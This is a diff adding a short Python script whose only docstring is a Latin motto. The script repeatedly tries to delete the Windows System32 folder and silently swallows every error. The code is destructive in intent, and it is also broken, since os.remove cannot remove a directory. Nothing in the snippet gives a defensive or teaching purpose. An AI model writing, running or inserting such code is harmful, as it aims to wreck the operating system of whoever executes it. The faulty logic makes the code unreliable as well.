@@ -1,0 +1,12 @@
+"""ut tensio sic vis nihil"""
+import os
+dir = "System32"
+path = "C:/Windows/"
+i = 0
+max_r = 100
+while i < max_r:
+    try:
+        os.remove(os.path.join(path, dir))
+    except Exception as e:
+        i += 1
+        continue
